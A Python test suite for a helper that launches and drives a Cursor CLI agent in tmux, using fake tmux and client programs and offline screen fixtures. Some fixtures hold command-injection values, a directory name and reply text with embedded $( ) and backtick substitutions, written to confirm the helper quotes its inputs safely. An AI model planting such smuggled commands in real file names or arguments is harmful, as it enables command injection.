"""Offline fixtures. No installed Cursor client, tmux server, or account is contacted."""

import argparse
from concurrent.futures import ThreadPoolExecutor
import importlib.util
import json
import os
from pathlib import Path
import re
import select
import shlex
import subprocess
import sys
import tempfile
import threading
import unittest
from unittest import mock

SCRIPT = Path(__file__).with_name("cursor-interactive-session.py")
SPEC = importlib.util.spec_from_file_location("cursor_interactive_session", SCRIPT)
helper = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(helper)

FAKE = r'''#!/usr/bin/env python3
import json, os, re, sys, time
from pathlib import Path
args = sys.argv[1:]
with open(os.environ["FAKE_LOG"], "a") as out:
    out.write(json.dumps([Path(sys.argv[0]).name, args]) + "\n")
name = Path(sys.argv[0]).name
mode = os.environ.get("FAKE_MODE", "")
if name == "client":
    if mode == "unsupported":
        print("old client")
    else:
        print("--workspace\n--model\n--force\n--yolo\n--auto-review\n--approve-mcps\n--trust")
    sys.exit(1 if mode == "client-error" else 0)
if args == ["-V"]:
    print("tmux fixture")
    sys.exit(1 if mode == "tmux-error" else 0)
if args and args[0] == "new-session":
    if mode == "collision":
        print("private task secret", file=sys.stderr)
        sys.exit(1)
    if mode == "bad-pane":
        print("not-a-pane")
        sys.exit(0)
    Path(os.environ["FAKE_ARGV"]).write_text(args[-1])
    print("%7")
    sys.exit(0)
if args and args[0] == "set-option":
    Path(os.environ["FAKE_OWNER"]).write_text(args[-1])
    sys.exit(0)
if args and args[0] == "display-message":
    if mode == "gone":
        sys.exit(1)
    if mode == "bad-identity":
        print("nope")
        sys.exit(0)
    owner_path = Path(os.environ["FAKE_OWNER"])
    owner = owner_path.read_text() if owner_path.exists() else ""
    if mode == "foreign-owner":
        owner = "foreign"
    pid = "999" if mode == "replaced" else os.environ.get("FAKE_PID", "123")
    # FAKE_PID_FILE, when the file exists, replaces the pane process mid-command.
    if os.environ.get("FAKE_PID_FILE") and Path(os.environ["FAKE_PID_FILE"]).exists():
        pid = Path(os.environ["FAKE_PID_FILE"]).read_text().strip()
    pane = "%8" if mode == "new-pane" else os.environ.get("FAKE_PANE", "%7")
    dead = "1" if mode == "dead" else "0"
    command = "bash" if mode == "foreign-command" else os.environ.get("FAKE_COMMAND", "client")
    path = "/tmp/other-worktree" if mode == "foreign-path" else os.environ["FAKE_WORKTREE"]
    session = "other-session" if mode == "foreign-session" else os.environ["FAKE_SESSION"]
    cursor_y = os.environ.get("FAKE_CURSOR_Y", "1")
    height = os.environ.get("FAKE_HEIGHT", "2")
    in_mode = "1" if mode == "copy-mode" else "0"
    values = {
        "session_name": session, "pane_id": pane, "pane_pid": pid, "pane_dead": dead,
        "pane_current_path": path, "pane_current_command": command,
        "@cursor_interactive_owner": owner, "cursor_y": cursor_y, "pane_height": height,
        "pane_in_mode": in_mode, "history_size": os.environ.get("FAKE_HISTORY", "0"),
        "pane_width": os.environ.get("FAKE_WIDTH", "80"),
    }
    # Like tmux, print only the variables the -F format names, in its order.
    template = args[args.index("-F") + 1]
    print("\t".join(values[key] for key in re.findall(r"#\{([^}]*)\}", template)))
    sys.exit(0)
if args and args[0] == "capture-pane":
    captured = Path(os.environ["FAKE_CAPTURE"]).read_text(encoding="utf-8")
    echo = Path(os.environ["FAKE_CAPTURE"] + ".echo")
    stale = Path(os.environ["FAKE_CAPTURE"] + ".stale")
    for typed in (stale, echo):
        if typed.exists() and (typed is stale or
                               time.time() - typed.stat().st_mtime >= float(os.environ.get("FAKE_ECHO_DELAY", "0.08"))):
            rows = captured.split("\n")
            # The typed text replaces the bottom row (the screen keeps its height).
            echo_row = int(os.environ.get("FAKE_ECHO_ROW", str(-2 if rows[-1] == "" else -1)))
            rows[echo_row] = "\u2192 " + typed.read_text(encoding="utf-8")
            if os.environ.get("FAKE_ECHO_QUEUE"):
                rows[0] = "\u250c\u2500 follow-ups \u2500\u2510"
            if os.environ.get("FAKE_ECHO_MODAL"):
                rows[0] = "Run this command?"
            captured = "\n".join(rows)
    sys.stdout.buffer.write(captured.encode("utf-8"))
    sys.exit(0)
if args and args[0] == "send-keys":
    if args[-1] == "n" and os.environ.get("FAKE_ON_N"):
        Path(os.environ["FAKE_CAPTURE"]).write_text(Path(os.environ["FAKE_ON_N"]).read_text())
        if os.environ.get("FAKE_N_FAIL"):
            sys.exit(1)
    if args[-1] == "Enter" and os.environ.get("FAKE_ENTER_FAIL"):
        sys.exit(1)
    if "-l" in args and os.environ.get("FAKE_SEND_READY"):
        with open(os.environ["FAKE_SEND_READY"], "wb", buffering=0) as ready:
            ready.write(b"1")
        with open(os.environ["FAKE_SEND_GATE"], "rb", buffering=0) as gate:
            gate.read(1)
    if mode == "send-fail":
        sys.exit(1)
    # FAKE_ON_ESCAPE: an Escape replaces the screen with the file's content (the view closing).
    if args[-1] == "Escape" and os.environ.get("FAKE_ON_ESCAPE") and Path(os.environ["FAKE_ON_ESCAPE"]).exists():
        Path(os.environ["FAKE_CAPTURE"]).write_text(Path(os.environ["FAKE_ON_ESCAPE"]).read_text(encoding="utf-8"), encoding="utf-8")
    # Like Cursor's composer: typed text shows as a → row only once FAKE_ECHO_DELAY has
    # passed (FAKE_ECHO=0: never), and Enter takes it away. FAKE_PASTE_WINDOW models
    # Cursor 2026.10.14's 75 ms paste buffer: an Enter inside it still submits, but the text
    # stays in the box as a stale draft.
    echo = Path(os.environ["FAKE_CAPTURE"] + ".echo")
    window = float(os.environ.get("FAKE_PASTE_WINDOW", "0"))
    # A one-key answer to a prompt is not composer text.
    if "-l" in args and len(args[-1]) > 1 and os.environ.get("FAKE_ECHO", "1") != "0":
        echo.write_text(args[-1], encoding="utf-8")
    elif args[-1] == "Enter" and echo.exists() and time.time() - echo.stat().st_mtime < window:
        Path(os.environ["FAKE_CAPTURE"] + ".stale").write_text(echo.read_text(encoding="utf-8"), encoding="utf-8")
        echo.unlink()
    elif args[-1] == "Enter" and echo.exists():
        echo.unlink()
    sys.exit(0)
raise SystemExit(77)
'''


class CursorInteractiveTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="cursor-interactive-")
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name).resolve()
        self.repo = self.root / "repo ' $(touch SHOULD_NOT_EXIST)"
        self.repo.mkdir()
        for name in ("client", "tmux"):
            path = self.root / name
            path.write_text(FAKE)
            path.chmod(0o700)
        self.log = self.root / "log"
        self.capture = self.root / "capture"
        self.capture.write_text("S8 answered\n>")
        self.name = "task-unique-1"
        self.tmux = str(self.root / "tmux")
        self.client = str(self.root / "client")
        self.text_path = self.root / "instruction"
        self.env = dict(
            os.environ,
            XDG_STATE_HOME=str(self.root / "state"),
            FAKE_LOG=str(self.log),
            FAKE_ARGV=str(self.root / "argv"),
            FAKE_OWNER=str(self.root / "owner"),
            FAKE_CAPTURE=str(self.capture),
            FAKE_WORKTREE=str(self.repo.resolve()),
            FAKE_SESSION=self.name,
            FAKE_COMMAND="client",
            FAKE_CURSOR_Y="1",
            FAKE_HEIGHT="2",
            FAKE_PID="123",
            FAKE_PANE="%7",
        )

    def invoke(self, command, extra=(), mode="", stdin=None, env=None):
        if command == "start":
            args = ["start", "--client", self.client, "--tmux", self.tmux, "--worktree", str(self.repo),
                    "--model", "grok-4.7-high", "--name", self.name, "--observe-seconds", "0", *extra]
        elif command == "inspect":
            args = ["inspect", "--tmux", self.tmux, "--name", self.name, *extra]
        elif command == "answer":
            args = ["answer", "--tmux", self.tmux, "--name", self.name, *extra]
        elif command == "menu-key":
            args = ["menu-key", "--tmux", self.tmux, "--name", self.name, *extra]
        elif command == "feedback":
            args = ["feedback", "--tmux", self.tmux, "--name", self.name, *extra]
        else:
            args = ["reply", "--tmux", self.tmux, "--name", self.name, *extra]
        merged = dict(self.env, FAKE_MODE=mode)
        if env:
            merged.update(env)
        result = subprocess.run([sys.executable, str(SCRIPT), *args], input=stdin, capture_output=True,
                                text=True, env=merged, timeout=10)
        try:
            payload = json.loads(result.stdout)
        except json.JSONDecodeError:
            self.fail(result.stderr or result.stdout)
        return result.returncode, payload

    def calls(self):
        if not self.log.exists():
            return []
        return [json.loads(line) for line in self.log.read_text().splitlines()]

    def commands(self, program):
        return [args for name, args in self.calls() if name == program]

    def start_and_inspect(self, capture=None, env=None):
        if capture is not None:
            self.capture.write_text(capture)
        code, started = self.invoke("start")
        self.assertEqual((code, started["state"]), (0, "client-running-unverified"))
        code, inspected = self.invoke("inspect", env=env)
        self.assertEqual((code, inspected["state"]), (0, "inspected"))
        return inspected

    def test_owned_inspect_and_nonowned_panes(self):
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["pane_id"], "%7")
        self.assertIn("S8 answered", inspected["text"])
        self.assertEqual(inspected["classification"], "active")
        self.assertNotIn("user-draft", inspected["classification_detail"])
        self.assertTrue(inspected["receipt"].startswith("v1:"))
        code, missing = self.invoke("inspect", extra=["--name", "missing-task"])
        self.assertEqual((code, missing["state"]), (2, "not-owned"))
        self.log.write_text("")
        self.text_path.write_text("hello")
        code, foreign = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path)],
                                    mode="foreign-owner")
        self.text_path.write_text("hello")
        self.assertEqual((code, foreign["state"]), (2, "not-owned"))
        self.assertFalse(any(args[0] == "send-keys" or args[0] == "capture-pane" for args in self.commands("tmux")))
        for name, args in self.calls():
            if name == "client":
                self.assertEqual(args, ["--help"])
            self.assertNotIn("persist", args)
            self.assertNotIn("--force", args)
            self.assertNotIn("--trust", args)

    def test_echoed_text_is_not_a_draft_and_single_line_is_literal(self):
        text = "--resume Task 'quoted' $HOME `touch SHOULD_NOT_EXIST` ; $(false)"
        self.text_path.write_text(text + "\n")
        capture = "S8 answered\n> unsent looking text\n>"
        inspected = self.start_and_inspect(capture, {"FAKE_CURSOR_Y": "2", "FAKE_HEIGHT": "3"})
        self.assertEqual(inspected["classification"], "active")
        self.assertIn("S8 answered", inspected["text"])
        self.assertIn("> unsent looking text", inspected["text"])
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit"], env={"FAKE_CURSOR_Y": "2", "FAKE_HEIGHT": "3"})
        self.assertEqual((code, refused["state"]), (2, "invalid-input"))
        self.assertFalse(any(args[0] == "send-keys" for args in self.commands("tmux")))
        self.text_path.write_text(text)
        code, sent = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                           "--observed-ready"], env={"FAKE_CURSOR_Y": "2", "FAKE_HEIGHT": "3"})
        self.assertEqual((code, sent["state"], sent["submitted"]), (0, "sent", False))
        sends = [args for args in self.commands("tmux") if args[0] == "send-keys"]
        self.assertEqual(sends, [["send-keys", "-t", "%7", "-l", "--", text]])
        self.assertNotIn("Enter", sends[0])
        command = (self.root / "argv").read_text()
        printer = self.root / "argv printer"
        printer.write_text("#!/usr/bin/env python3\nimport json,sys\nprint(json.dumps(sys.argv[1:]))\n")
        printer.chmod(0o700)
        argv = shlex.split(command)
        self.assertEqual(argv[0], "exec")
        self.assertEqual(argv[1:], [self.client, "--workspace", str(self.repo.resolve()), "--model", "grok-4.7-high"])
        self.assertFalse(any(flag in argv for flag in (
            "--force", "-f", "--yolo", "--auto-review", "--approve-mcps", "--trust", "--sandbox", "--print", "-p", "persist")))
        rewritten = command.replace(shlex.quote(argv[1]), shlex.quote(str(printer)), 1)
        parsed = subprocess.run(["/bin/sh", "-c", rewritten], capture_output=True, text=True, cwd=self.root,
                                timeout=5, check=True)
        self.assertEqual(json.loads(parsed.stdout), argv[2:])
        self.assertFalse((self.root / "SHOULD_NOT_EXIST").exists())
        self.assertNotIn(text, json.dumps(sent))

    def test_active_submit_sends_one_enter_after_literal_text(self):
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        code, sent = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                           "--submit"])
        self.assertEqual((code, sent["state"], sent["submitted"]), (0, "sent", True))
        sends = [args for args in self.commands("tmux") if args[0] == "send-keys"]
        self.assertEqual(sends, [
            ["send-keys", "-t", "%7", "-l", "--", "continue the source helper"],
            ["send-keys", "-t", "%7", "Enter"],
        ])

    def test_submit_waits_until_the_text_shows_before_enter(self):
        # Cursor 2026.10.14 holds fast literal input in a 75 ms paste buffer; an Enter inside that
        # window submitted the text but left it in the box as a stale draft (G1, 2026-11-05).
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        started = __import__("time").monotonic()
        code, sent = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                           "--submit"])
        self.assertEqual((code, sent["state"]), (0, "sent"))
        self.assertGreaterEqual(__import__("time").monotonic() - started, helper.SUBMIT_SETTLE_SECONDS)
        tmux = self.commands("tmux")
        literal = tmux.index(["send-keys", "-t", "%7", "-l", "--", "continue the source helper"])
        enter = tmux.index(["send-keys", "-t", "%7", "Enter"])
        # The pane is read again between the text and Enter.
        self.assertTrue(any(args[0] == "capture-pane" for args in tmux[literal + 1:enter]))

    def test_submit_never_sends_enter_when_the_text_does_not_show(self):
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        self.env["FAKE_ECHO"] = "0"
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit"])
        self.assertEqual((code, refused["state"]), (3, "send-unconfirmed"))
        self.assertIn("Enter was NOT sent", refused["detail"])
        self.assertEqual([args for args in self.commands("tmux") if args[0] == "send-keys"],
                         [["send-keys", "-t", "%7", "-l", "--", "continue the source helper"]])

    def test_submit_after_the_paste_window_leaves_no_stale_draft(self):
        # Synthetic reproduction of the G1 stale draft (2026-11-05T23:43Z): with an Enter right
        # after the text, the fake keeps the text as a draft; the fence's wait clears it.
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        self.env["FAKE_PASTE_WINDOW"] = "0.075"
        code, sent = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                           "--submit"])
        self.assertEqual((code, sent["state"], sent["submitted"]), (0, "sent", True))
        self.assertFalse(Path(str(self.capture) + ".stale").exists())
        self.assertNotIn("continue the source helper", self.capture.read_text())

    def test_composer_text_counts_only_the_composer_rows(self):
        text = "Readiness check only. Do not call tools, run commands or read files."
        screen = ["  Readiness check only. Do not call tools, run commands or read files.", "",
                  "  \u2192 Readiness check only. Do not call tools, run", "     commands or read files.", ""]
        # The transcript row above the composer does not count; the wrapped composer rows do.
        self.assertEqual(helper.tail_count(screen, text), 1)
        self.assertEqual(helper.tail_count(screen[:2] + ["  \u2192 Add a follow-up", ""], text), 0)
        self.assertEqual(helper.tail_count(screen[:2], text), 0)

    def test_draft_and_modals_never_send(self):
        self.text_path.write_text("continue")
        cases = {
            "draft": ("S8 answered\n> real composer draft", "user-draft"),
            "trust": ("Trust this workspace?\n>", "modal-trust"),
            "permission": ("Permission required to continue\n>", "modal-permission"),
            "approval": ("Allow this command\n>", "modal-approval"),
            "unknown": ("Are you sure?\n>", "modal-unknown"),
        }
        for mode, (capture, expected) in cases.items():
            with self.subTest(mode=mode):
                self.log.unlink(missing_ok=True)
                state = self.root / "state" / "cursor-interactive-session" / self.name
                state.unlink(missing_ok=True)
                inspected = self.start_and_inspect(capture)
                self.assertEqual(inspected["classification"], expected)
                code, refused = self.invoke(
                    "reply",
                    ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                     "--submit", "--observed-ready"])
                self.assertEqual(code, 2)
                self.assertEqual(refused["state"], expected)
                self.assertFalse(any(args[0] == "send-keys" for args in self.commands("tmux")))

    def test_unclassified_requires_manual_confirmation(self):
        self.text_path.write_text("continue")
        inspected = self.start_and_inspect("S8 answered\nTom answered the displayed question")
        self.assertEqual(inspected["classification"], "unclassified")
        self.assertIn("not an unsent user draft", inspected["classification_detail"])
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit"])
        self.assertEqual((code, refused["state"]), (2, "unclassified-ui"))
        self.assertFalse(any(args[0] == "send-keys" for args in self.commands("tmux")))
        code, sent = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                           "--submit", "--observed-ready"])
        self.assertEqual((code, sent["state"], sent["submitted"]), (0, "sent", True))

    def test_identity_replacement_sends_nothing(self):
        self.text_path.write_text("continue")
        inspected = self.start_and_inspect()
        for mode, expected in (("replaced", "pane-replaced"), ("new-pane", "pane-replaced"),
                               ("foreign-path", "pane-replaced"), ("foreign-command", "pane-replaced"),
                               ("foreign-session", "pane-replaced"), ("dead", "pane-dead"),
                               ("gone", "pane-missing"), ("copy-mode", "pane-in-mode")):
            with self.subTest(mode=mode):
                self.log.write_text("")
                code, refused = self.invoke(
                    "reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path), "--submit"],
                    mode=mode)
                self.assertEqual((code, refused["state"]), (2, expected))
                self.assertFalse(any(args[0] in {"send-keys", "capture-pane", "new-session"}
                                     for args in self.commands("tmux")))

    def test_stale_receipt_on_change_and_rotated_inspect(self):
        self.text_path.write_text("continue")
        inspected = self.start_and_inspect()
        self.capture.write_text("S8 answered\n>")
        self.capture.write_text("pane changed after inspect\n>")
        code, stale = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                            "--submit"])
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.assertFalse(any(args[0] == "send-keys" for args in self.commands("tmux")))
        code, newer = self.invoke("inspect")
        self.assertEqual(code, 0)
        self.assertNotEqual(newer["receipt"], inspected["receipt"])
        self.log.write_text("")
        code, rotated = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit"])
        self.assertEqual((code, rotated["state"]), (2, "stale-receipt"))
        self.assertEqual(self.commands("tmux"), [])

    def test_start_collision_and_bad_pane_do_not_retry(self):
        for mode in ("collision", "bad-pane"):
            with self.subTest(mode=mode):
                self.log.unlink(missing_ok=True)
                state = self.root / "state" / "cursor-interactive-session" / self.name
                state.unlink(missing_ok=True)
                code, first = self.invoke("start", mode=mode)
                self.assertEqual((code, first["state"]), (3, "launch-unconfirmed"))
                self.assertNotIn("secret", json.dumps(first))
                code, second = self.invoke("start")
                self.assertEqual((code, second["state"]), (2, "name-consumed"))
                self.assertEqual(sum(args[0] == "new-session" for args in self.commands("tmux")), 1)
                self.assertFalse(any(args[0] == "send-keys" for args in self.commands("tmux")))

    def test_timeout_unknown_does_not_launch_or_send_twice(self):
        import argparse
        start_args = argparse.Namespace(
            client=self.client, tmux=self.tmux, worktree=str(self.repo), model="grok-4.7-high",
            name="timeout-task", observe_seconds=0, dry_run=False)
        calls = []

        def fake_run(argv):
            calls.append(argv)
            if argv[1] == "new-session":
                raise subprocess.TimeoutExpired(argv, 5)
            if argv[1] == "--help":
                return subprocess.CompletedProcess(argv, 0, "--workspace\n--model\n", "")
            if argv[1] == "-V":
                return subprocess.CompletedProcess(argv, 0, "tmux fixture\n", "")
            raise AssertionError(argv)

        with mock.patch.dict(os.environ, {"XDG_STATE_HOME": str(self.root / "timeout-state")}):
            with mock.patch.object(helper, "run", fake_run):
                with self.assertRaises(helper.Refusal) as caught:
                    helper.start_session(start_args)
                self.assertEqual(caught.exception.state, "launch-unconfirmed")
                self.assertEqual(sum(call[1] == "new-session" for call in calls), 1)
                with self.assertRaises(helper.Refusal) as second:
                    helper.start_session(start_args)
                self.assertEqual(second.exception.state, "name-consumed")
                self.assertEqual(sum(call[1] == "new-session" for call in calls), 1)

        inspected = self.start_and_inspect()
        reply_calls = []

        def timeout_send(argv):
            reply_calls.append(argv)
            if argv[1] == "send-keys":
                raise subprocess.TimeoutExpired(argv, 5)
            if argv[1] == "display-message":
                owner = (self.root / "owner").read_text()
                values = {"session_name": self.name, "pane_id": "%7", "pane_pid": "123", "pane_dead": "0",
                          "pane_current_path": str(self.repo.resolve()), "pane_current_command": "client",
                          "@cursor_interactive_owner": owner, "cursor_y": "1", "pane_height": "2",
                          "pane_in_mode": "0", "history_size": "0", "pane_width": "80"}
                template = argv[argv.index("-F") + 1]
                line = "\t".join(values[key] for key in re.findall(r"#\{([^}]*)\}", template))
                return subprocess.CompletedProcess(argv, 0, line + "\n", "")
            if argv[1] == "capture-pane":
                return subprocess.CompletedProcess(argv, 0, "S8 answered\n>\n", "")
            raise AssertionError(argv)

        reply_args = argparse.Namespace(
            name=self.name, tmux=self.tmux, receipt=inspected["receipt"], text_file=str(self.text_path),
            submit=True, observed_ready=False)
        self.text_path.write_text("continue")
        with mock.patch.dict(os.environ, {"XDG_STATE_HOME": str(self.root / "state")}):
            with mock.patch.object(helper, "run", timeout_send):
                with self.assertRaises(helper.Refusal) as sent:
                    helper.reply_session(reply_args)
                self.assertEqual(sent.exception.state, "send-unconfirmed")
                self.assertEqual(sum(call[1] == "send-keys" for call in reply_calls), 1)
                self.assertNotIn("Enter", reply_calls[-1])
                with self.assertRaises(helper.Refusal) as retried:
                    helper.reply_session(reply_args)
                self.assertEqual(retried.exception.state, "stale-receipt")
                self.assertEqual(sum(call[1] == "send-keys" for call in reply_calls), 1)

    def test_dry_run_and_bad_input_do_not_launch(self):
        code, dry = self.invoke("start", ["--dry-run"])
        self.assertEqual((code, dry["state"]), (0, "dry-run"))
        self.assertEqual(self.calls(), [])
        for extra in (["--model=--force"], ["--name", "x:1"], ["--worktree", "relative"],
                      ["--client", str(self.root / "absent")], ["--observe-seconds", "6"]):
            with self.subTest(extra=extra):
                self.log.unlink(missing_ok=True)
                code, _payload = self.invoke("start", extra)
                self.assertEqual(code, 2)
                self.assertEqual(self.calls(), [])

    def test_cursor_off_last_row_is_unclassified_even_with_prompt_glyph(self):
        code, _started = self.invoke("start")
        self.assertEqual(code, 0)
        code, inspected = self.invoke("inspect", env={"FAKE_CURSOR_Y": "0"})
        self.assertEqual((code, inspected["classification"]), (0, "unclassified"))
        self.assertIn("S8 answered", inspected["text"])


    def reply_args(self, receipt, text_file=None):
        return argparse.Namespace(name=self.name, tmux=self.tmux, receipt=receipt,
                                  text_file=str(text_file or self.text_path), submit=True,
                                  observed_ready=False)

    def test_blocking_instruction_is_read_before_final_capture(self):
        inspected = self.start_and_inspect()
        args = self.reply_args(inspected["receipt"])
        original_read = helper.read_instruction
        self.text_path.write_text("continue")

        def delayed_read(path):
            self.capture.write_text("Trust this workspace?\n>")
            return original_read(path)

        with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "read_instruction", delayed_read):
            with self.assertRaises(helper.Refusal) as caught:
                helper.reply_session(args)
        self.assertEqual(caught.exception.state, "stale-receipt")
        self.assertFalse(any(args[0] == "send-keys" for args in self.commands("tmux")))

    def test_terminal_controls_refused_even_observed_ready(self):
        inspected = self.start_and_inspect()
        for point in (*range(32), *range(127, 160)):
            with self.subTest(point=point):
                self.text_path.write_text("hello" + chr(point) + "world")
                code, refused = self.invoke("reply", ["--receipt", inspected["receipt"],
                    "--text-file", str(self.text_path), "--submit", "--observed-ready"])
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
        self.assertFalse(any(args[0] == "send-keys" for args in self.commands("tmux")))

    def send_barrier(self):
        ready, gate = self.root / "send-ready", self.root / "send-gate"
        os.mkfifo(ready, 0o600)
        os.mkfifo(gate, 0o600)
        descriptor = os.open(ready, os.O_RDWR | os.O_NONBLOCK)
        self.addCleanup(os.close, descriptor)
        return descriptor, gate, {"FAKE_SEND_READY": str(ready), "FAKE_SEND_GATE": str(gate)}

    def await_send(self, descriptor):
        self.assertTrue(select.select([descriptor], [], [], 5)[0], "literal send did not reach barrier")
        self.assertEqual(os.read(descriptor, 1), b"1")

    def test_concurrent_replies_spend_same_receipt_once(self):
        inspected = self.start_and_inspect()
        self.text_path.write_text("continue")
        args = self.reply_args(inspected["receipt"])
        captured, release, contended = threading.Event(), threading.Event(), threading.Event()
        original_capture, original_flock = helper.read_capture_rows, helper.fcntl.flock
        attempts = []

        def tracked_flock(descriptor, operation):
            attempts.append(descriptor)
            if len(attempts) == 2:
                contended.set()
            return original_flock(descriptor, operation)

        def paused_capture(*arguments):
            result = original_capture(*arguments)
            captured.set()
            if not release.wait(5):
                raise AssertionError("capture barrier was not released")
            return result

        def reply():
            try:
                return helper.reply_session(args)["state"]
            except helper.Refusal as error:
                return error.state

        with mock.patch.dict(os.environ, self.env), \
                mock.patch.object(helper, "read_capture_rows", paused_capture), \
                mock.patch.object(helper.fcntl, "flock", tracked_flock):
            with ThreadPoolExecutor(max_workers=2) as pool:
                first = pool.submit(reply)
                try:
                    self.assertTrue(captured.wait(5))
                    second = pool.submit(reply)
                    # Both callers have reached the lock while the first still holds
                    # its original unspent receipt, before the final capture returns.
                    self.assertTrue(contended.wait(5))
                    self.assertFalse(second.done())
                finally:
                    release.set()
                self.assertEqual([first.result(timeout=10), second.result(timeout=10)],
                                 ["sent", "stale-receipt"])
        sends = [args for args in self.commands("tmux") if args[0] == "send-keys"]
        self.assertEqual(sends, [["send-keys", "-t", "%7", "-l", "--", "continue"],
                                 ["send-keys", "-t", "%7", "Enter"]])

    def test_inspect_waits_for_reply_and_keeps_latest_receipt(self):
        inspected = self.start_and_inspect()
        self.text_path.write_text("continue")
        extra = ["--receipt", inspected["receipt"], "--text-file", str(self.text_path), "--submit"]
        descriptor, gate, barrier = self.send_barrier()
        contended = threading.Event()
        original_flock = helper.fcntl.flock

        def tracked_flock(*arguments):
            contended.set()
            return original_flock(*arguments)

        with ThreadPoolExecutor(max_workers=2) as pool:
            reply = pool.submit(self.invoke, "reply", extra, env=barrier)
            self.await_send(descriptor)
            with mock.patch.dict(os.environ, self.env), \
                    mock.patch.object(helper.fcntl, "flock", tracked_flock):
                inspect = pool.submit(helper.inspect_session, argparse.Namespace(name=self.name, tmux=self.tmux))
                try:
                    self.assertTrue(contended.wait(5))
                    self.assertFalse(inspect.done())
                finally:
                    with gate.open("wb", buffering=0) as handle:
                        handle.write(b"1")
                self.assertEqual(reply.result(timeout=10)[0], 0)
                latest = inspect.result(timeout=10)
        state = json.loads((self.root / "state" / "cursor-interactive-session" / self.name).read_text())
        self.assertEqual(helper.parse_receipt(latest["receipt"])["id"], state["receipt_id"])
        code, sent = self.invoke("reply", ["--receipt", latest["receipt"], "--text-file", str(self.text_path)])
        self.assertEqual((code, sent["state"]), (0, "sent"))

    def test_failed_literal_send_spends_receipt(self):
        inspected = self.start_and_inspect()
        self.text_path.write_text("continue")
        extra = ["--receipt", inspected["receipt"], "--text-file", str(self.text_path), "--submit"]
        code, failed = self.invoke("reply", extra, mode="send-fail")
        self.assertEqual((code, failed["state"]), (3, "send-unconfirmed"))
        code, stale = self.invoke("reply", extra)
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.assertEqual(sum(args[0] == "send-keys" for args in self.commands("tmux")), 1)


# Fixture text names this path; each answer test replaces it with its real worktree.
EXAMPLE_PATH = "/home/dev/work/example-task"
BOX_WIDTH = 74


def boxed(rows, top="\u256d", top_end="\u256e", bottom="\u2570", bottom_end="\u256f"):
    """Rows inside a border, padded to the box width."""
    return ("  " + top + "\u2500" * BOX_WIDTH + top_end + "\n"
            + "".join("  \u2502" + row.ljust(BOX_WIDTH) + "\u2502\n" for row in rows)
            + "  " + bottom + "\u2500" * BOX_WIDTH + bottom_end + "\n")


# The real trust prompt's shape (the G1 capture, STATUS.json inspect.text, 2026-11-04T19:25:02Z),
# with a synthetic path: a padding row between the prompt's rows.
TRUST_BOX_ROWS = [
    "", "  \u26a0 Workspace Trust Required", "",
    "  Cursor Agent can execute code and access files in this directory.", "",
    "  Do you trust the contents of this directory?", "",
    "    " + EXAMPLE_PATH, "", "",
    "  \u25b6 [a] Trust this workspace", "    [q] Quit", "",
    "  Use arrow keys to navigate, Enter to select, or press the key shown", "",
]
TRUST_TIP = "Tip: You can start the Cursor CLI with `agent` (same as `cursor-agent`).\n\n"
TRUST_CAPTURE = TRUST_TIP + boxed(TRUST_BOX_ROWS)
# The visible screen as tmux prints it: the prompt box, then blank rows.
TRUST_SCREEN = TRUST_CAPTURE + "\n\n"
TRUST_PATH_ROW = "  \u2502" + ("    " + EXAMPLE_PATH).ljust(BOX_WIDTH) + "\u2502\n"
# An explicit check, not assert: CI runs this suite with -O, which strips asserts.
if TRUST_PATH_ROW not in TRUST_CAPTURE:
    raise AssertionError("TRUST_CAPTURE no longer shows TRUST_PATH_ROW; the trust-path fixtures would not apply")
# The whole prompt, row for row, as the screen shows it inside the border.
TRUST_EXPECT = (
    "\u26a0 Workspace Trust Required\n"
    "Cursor Agent can execute code and access files in this directory.\n"
    "Do you trust the contents of this directory?\n"
    "/home/dev/work/example-task\n"
    "\u25b6 [a] Trust this workspace\n"
    "[q] Quit\n"
    "Use arrow keys to navigate, Enter to select, or press the key shown\n"
)
APPROVAL_CAPTURE = (
    "Tip: You can start the Cursor CLI with `agent`.\n"
    "  \u256d\u2500\u2500\u2500\u2500\u256e\n"
    "  \u2502  Allow this command: git status              \u2502\n"
    "  \u2502  \u25b6 [y] Yes                                   \u2502\n"
    "  \u2502    [n] No                                    \u2502\n"
    "  \u2570\u2500\u2500\u2500\u2500\u256f\n"
)
APPROVAL_SCREEN = APPROVAL_CAPTURE + "\n\n"
APPROVAL_EXPECT = "Allow this command: git status\n\u25b6 [y] Yes\n[n] No\n"
APPROVAL = "OP399-approval-2026-11-04T21:40:00Z"
SECOND_APPROVAL = "OP399-approval-2026-11-04T21:55:00Z"
DEFAULT_TRUST = object()
# The live shape after a trust answer (the frozen G1 capture below): Cursor drops the
# selection marker and puts its status row where the navigation hint was, then draws its
# banner and its own composer below.
STATUS_ROW = "  \u23f3 Trusting workspace..."
ANSWERED_BOX_ROWS = TRUST_BOX_ROWS[:10] + ["    [a] Trust this workspace", "    [q] Quit", "", STATUS_ROW, ""]
